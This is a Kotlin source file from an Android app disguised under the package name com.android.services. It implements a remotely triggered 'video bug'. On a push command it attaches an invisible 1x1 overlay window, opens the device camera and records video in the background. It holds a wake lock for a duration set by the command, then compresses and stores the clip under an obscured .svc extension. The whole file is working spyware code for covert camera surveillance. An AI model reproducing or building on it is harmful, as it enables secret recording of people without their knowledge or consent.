package com.android.services.services.videoBug

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.media.MediaScannerConnection
import android.os.Build
import android.os.Handler
import android.os.PowerManager
import android.util.Log
import android.view.*
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.Observer
import com.android.services.R
import com.android.services.db.entities.VideoBug
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.services.RemoteDataService
import com.android.services.util.*
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.arthenica.mobileffmpeg.Config
import com.arthenica.mobileffmpeg.FFmpeg
import kotlinx.coroutines.*
import java.io.File
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException
import kotlin.coroutines.suspendCoroutine

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class VideoBugCommandProcessingBaseImpl(
    val service: LifecycleService,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : VideoBugCommandProcessingBase(service.applicationContext) {

    override fun initialize() {
        try {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} In Initialize() -> Ready to attach a Floating Window")
            val notificationIntent =
                Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                service.applicationContext,
                VIDEO_BUG_NOTIFICATION_ID,
                notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT
            )
            val notification =
                NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                    .setContentText("Running in background...")
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentIntent(pendingIntent)
                    .build()
            service.startForeground(VIDEO_BUG_NOTIFICATION_ID, notification)

            mWindowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            viewFinder = AutoFitSurfaceView(applicationContext)
            val layoutParams = WindowManager.LayoutParams(
                1, 1,
                windowManagerFlagOverlay,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
            )
            layoutParams.gravity = Gravity.START or Gravity.TOP
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} Attaching AutoFitTextureView to Window ")
            mWindowManager.addView(viewFinder, layoutParams)
            videoBugStatus = FcmPushStatus.INITIALIZED.getStatus()
        } catch (exp: Exception) {
            logException("${AppConstants.VIDEO_BUG_TYPE} Initialize() Error: ${exp.message}",
                throwable = exp)
            service.stopSelf()
        }
    }

    override fun parseIntent(intent: Intent?) {
        intent?.let {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} In OnStartCommand -> Ready to start VideoBug Recording")
            videoBugPush = it.getParcelableExtra(VIDEO_BUG_PUSH)
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} VideoBug Command = $videoBugPush")

            if (videoBugStatus != null) {
                videoBugPush?.let { push ->
                    acquireWakeLock()
                    intervalConsumed = 0
                    push.customData?.let { data-> customData=data }
                    viewFinder.holder.addCallback(object : SurfaceHolder.Callback {
                        override fun surfaceDestroyed(holder: SurfaceHolder) = Unit
                        override fun surfaceChanged(
                            holder: SurfaceHolder,
                            format: Int,
                            width: Int,
                            height: Int,
                        ) = Unit

                        override fun surfaceCreated(holder: SurfaceHolder) {
                            try {
                                // Selects appropriate preview size and configures view finder
                                val previewSize = getPreviewOutputSize(
                                    viewFinder.display,
                                    characteristics,
                                    SurfaceHolder::class.java
                                )
                                logVerbose(
                                    "${AppConstants.VIDEO_BUG_TYPE} View finder size: ${viewFinder.width} x ${viewFinder.height}"
                                )
                                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Selected preview size: $previewSize")
                                viewFinder.setAspectRatio(previewSize.width, previewSize.height)
                                // To ensure that size is set, initialize camera in the view's thread
                                viewFinder.post {
                                    initializeCamera()
                                }
                            } catch (exp: Exception) {
                                logException("${AppConstants.VIDEO_BUG_TYPE} surface created exception = ${exp.message}")
                            }
                        }
                    })

                    // Used to rotate the output media to match device orientation
                    relativeOrientation = OrientationLiveData(service, characteristics).apply {
                        observe(service, Observer { orientation ->
                            logVerbose("${AppConstants.VIDEO_BUG_TYPE} Orientation changed: $orientation")
                        })
                    }
                } ?: kotlin.run {
                    logVerbose("VideoBug Push is Null -> Stopping Service",
                        AppConstants.VIDEO_BUG_TYPE)
                    service.stopSelf()
                }
            } else {
                updateVideoBugPushAsCorrupted()
            }
        } ?: kotlin.run {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} VideoBug Intent is Null ")
            AppUtils.appendLog(applicationContext,
                "VideoBugBug Intent is null, stopping service")
            service.stopSelf()
        }
    }

    override fun createOutputFilePath(): String {
        mRecordingStartTime = System.currentTimeMillis()
        return AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_VIDEO_BUG,
            "$mRecordingStartTime.svc"
        )
    }

    @SuppressLint("ClickableViewAccessibility")
    private fun initializeCamera() = coroutineScope.launch(Dispatchers.Main) {
        try {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} cameraId = $cameraId")
            // Open the selected camera
            camera = openCamera(cameraManager, cameraId, cameraHandler)
            // Creates list of Surfaces where the camera will output frames
            val targets = listOf(viewFinder.holder.surface, recorderSurface)
            // Start a capture session using our open camera and list of Surfaces where frames will go
            session = createCaptureSession(camera, targets, cameraHandler)
            // Sends the capture request as frequently as possible until the session is torn down or
            //  session.stopRepeating() is called
            session.setRepeatingRequest(previewRequest, null, cameraHandler)
            startVideoRecording()
        } catch (exp: Exception) {
            logException("${AppConstants.VIDEO_BUG_TYPE} initializeCamera() exception = ${exp.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun openCamera(
        manager: CameraManager,
        cameraId: String,
        handler: Handler? = null,
    ): CameraDevice = suspendCancellableCoroutine { cont ->
        manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(device: CameraDevice) = cont.resume(device)

            override fun onDisconnected(device: CameraDevice) {
                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Camera $cameraId has been disconnected")
            }

            override fun onError(device: CameraDevice, error: Int) {
                val msg = when (error) {
                    ERROR_CAMERA_DEVICE -> "Fatal (device)"
                    ERROR_CAMERA_DISABLED -> "Device policy"
                    ERROR_CAMERA_IN_USE -> "Camera in use"
                    ERROR_CAMERA_SERVICE -> "Fatal (service)"
                    ERROR_MAX_CAMERAS_IN_USE -> "Maximum cameras in use"
                    else -> "Unknown"
                }
                val exc = RuntimeException("Camera $cameraId error: ($error) $msg")
                logException("${AppConstants.VIDEO_BUG_TYPE} Camera Error ${exc.message!!}",
                    throwable = exc)
                if (cont.isActive) {
                    logVerbose("${AppConstants.VIDEO_BUG_TYPE} Resuming with exception = ${exc.message}")
                    cont.resumeWithException(exc)
                }
                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Stopping the Recording and setting file as corrupted")
                videoBugStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
                stopRecording()
            }
        }, handler)
    }

    /**
     * Creates a [CameraCaptureSession] and returns the configured session (as the result of the
     * suspend coroutine)
     */
    private suspend fun createCaptureSession(
        device: CameraDevice,
        targets: List<Surface>,
        handler: Handler? = null,
    ): CameraCaptureSession = suspendCoroutine { cont ->

        // Creates a capture session using the predefined targets, and defines a session state
        // callback which resumes the coroutine once the session is configured
        device.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {

            override fun onConfigured(session: CameraCaptureSession) = cont.resume(session)

            override fun onConfigureFailed(session: CameraCaptureSession) {
                val exc =
                    RuntimeException("${AppConstants.VIDEO_BUG_TYPE} Camera ${device.id} session configuration failed")
                logException("${AppConstants.VIDEO_BUG_TYPE} createCaptureSession failed = ${exc.message!!}",
                    throwable = exc)
                cont.resumeWithException(exc)
                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Stopping the Recording and setting file as corrupted")
                videoBugStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
                stopRecording()
            }
        }, handler)
    }

    override fun stopRecording() {
        service.stopSelf()
    }

    /** This compresses the Output VideoBug File **/
    private suspend fun compressOutputFile(): String? {
        return try {
            if (AppConstants.osGreaterThanEqualToNougat) {
                withContext(Dispatchers.IO) {
                    val fileName = mFilePath.substringAfterLast("/").replace(".svc", ".mp4")
                    val destFile = "compress_$fileName"
                    val destFilePAth =
                        mFilePath.replace(mFilePath.substringAfterLast("/"), destFile)
                    //Old Command that was compressing 50%
//            val rc = FFmpeg.execute("-i $mFilePath -c:v mpeg4 $destFilePAth")

                    // Working commands
//            -y -i $mFilePath -ar 44100 -ac 2 -ab 48k -f mp3 $destFilePAth
                    // This command will compress the file 67%
                    logVerbose("size before compression = ${File(mFilePath).sizeInKb}")
                    val command = arrayOf(
                        "-y",
                        "-i",
                        mFilePath,
                        "-s",
                        "180x140",
                        "-vcodec",
                        "h264",
                        "-crf",
                        "28",
                        "-b:v",
                        "150k",
                        "-b:a",
                        "48000",
                        "-ac",
                        "2",
                        "-ar",
                        "22050",
                        destFilePAth
                    )
                    when (val rc = FFmpeg.execute(command)) {
                        Config.RETURN_CODE_SUCCESS -> {
                            logVerbose(
                                "Command execution completed successfully.",
                                AppConstants.VIDEO_BUG_TYPE
                            )
                            logVerbose("size after compression = ${File(destFilePAth).sizeInKb}")

                            destFilePAth
                        }
                        Config.RETURN_CODE_CANCEL -> {
                            logVerbose(
                                "Command execution cancelled by user.",
                                AppConstants.VIDEO_BUG_TYPE
                            )
                            null
                        }
                        else -> {
                            logVerbose(
                                String.format(
                                    "Command execution failed with rc=%d and the output below.",
                                    rc
                                ), AppConstants.VIDEO_BUG_TYPE
                            )
                            Config.printLastCommandOutput(Log.INFO)
                            null
                        }
                    }
                }
            } else null
        } catch (e: Exception) {
            null
        }
    }

    override fun onServiceDestroy() {
        logVerbose("${AppConstants.VIDEO_BUG_TYPE} In OnDestroy -> Releasing Resources")
        coroutineScope.launch(Dispatchers.Main) {
            try {
                stopVideoRecording()
                releaseResources()
                var destFile:String?=null
                try {
                     destFile = compressOutputFile()
                }catch (e:Exception){
                    logVerbose("Exception while compressing the video bug e=$e")
                }
                reNameFile(applicationContext, mFilePath, destFile)
                insertVideoBug()
                shutDownExecutorService()
                removeWindow()
                releaseWakeLock()
            } catch (exp: Exception) {
                logException("${AppConstants.VIDEO_BUG_TYPE} onDestroy Exception = ${exp.message}")
                updateVideoBugPushAsCorrupted()
            }
        }
    }

    private suspend fun reNameFile(context: Context, sourceFile: String, destFile: String?) {
        withContext(Dispatchers.IO) {
            if (destFile != null) {
                AppUtils.reNameSourceFileWithDestFile(
                    context,
                    sourceFile,
                    destFile,
                    AppConstants.VIDEO_BUG_TYPE
                )
            } else {
                AppUtils.reNameFile(sourceFile, AppConstants.VIDEO_BUG_TYPE)
                logVerbose("compression destFile Path is Null", AppConstants.VIDEO_BUG_TYPE)
            }
        }
    }
    private fun shutDownExecutorService() {
        if (!executorService.isShutdown) {
            executorService.shutdown()
        }
    }

    private fun startVideoRecording() {
        session.setRepeatingRequest(recordRequest, null, cameraHandler)
        recorder.apply {
            relativeOrientation.value?.let { setOrientationHint(it) }
            prepare()
            start()
        }
        logVerbose("${AppConstants.VIDEO_BUG_TYPE} Recording started")
    }

    @Throws(Exception::class)
    private suspend fun stopVideoRecording() {
        withContext(Dispatchers.IO) {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} Recording stopped. Output file: $mFilePath")
            recorder.stop()
            MediaScannerConnection.scanFile(
                applicationContext, arrayOf(mFilePath), null, null
            )
        }
    }

    @Throws(Exception::class)
    private suspend fun releaseResources() {
        withContext(Dispatchers.IO) {
            camera.close()
            cameraThread.quitSafely()
            recorder.release()
            recorderSurface.release()
        }
    }

    private suspend fun insertVideoBug() {
        withContext(Dispatchers.IO) {
            when (videoBugStatus) {
                FcmPushStatus.SUCCESS.getStatus(), FcmPushStatus.INTERRUPTED.getStatus() -> {
                    val videoBug = VideoBug()
                    videoBug.file = mFilePath
                    videoBug.name = AppUtils.formatDateCustom(mRecordingStartTime.toString())
                    videoBug.cameraType = videoBugPush!!.cameraOption
                    videoBug.startDatetime = AppUtils.formatDate(mRecordingStartTime.toString())
                    videoBug.pushId = videoBugPush!!.pushId
                    videoBug.pushStatus = videoBugStatus
                    videoBug.status = 0
                    localDatabaseSource.insertVideoBug(videoBug)
                }
                FcmPushStatus.INITIALIZED.getStatus() -> {
                    localDatabaseSource.updatePushStatus(
                        videoBugPush!!.pushId,
                        FcmPushStatus.FAILED.getStatus(),
                        0
                    )
                }
                else -> {
                    if(videoBugPush!=null &&videoBugStatus!=null){
                        localDatabaseSource.updatePushStatus(
                            videoBugPush!!.pushId,
                            videoBugStatus!!,
                            0
                        )
                        AppUtils.deleteFile(applicationContext, mFilePath)
                        logVerbose("${AppConstants.VIDEO_BUG_TYPE} VideoBug failed with status $videoBugStatus")
                    }
                    return@withContext
                }
            }
        }
    }

    private fun updateVideoBugPushAsCorrupted() {
        videoBugStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
        coroutineScope.launch {
            withContext(Dispatchers.IO) {
                localDatabaseSource.updatePushStatus(
                    videoBugPush!!.pushId,
                    videoBugStatus!!,
                    0
                )
                AppUtils.deleteFile(applicationContext, mFilePath)
            }
        }
        service.stopSelf()
    }

    private fun acquireWakeLock() {
        val pm = service.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            TAG_VIDEO_BUG_WAKE_LOCK
        )
        wakeLock!!.acquire((customData.toInt() * 60 * 1000).toLong())
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }

    private fun removeWindow() {
        if (viewFinder.parent != null) {
            mWindowManager.removeViewImmediate(viewFinder)
        }
    }
}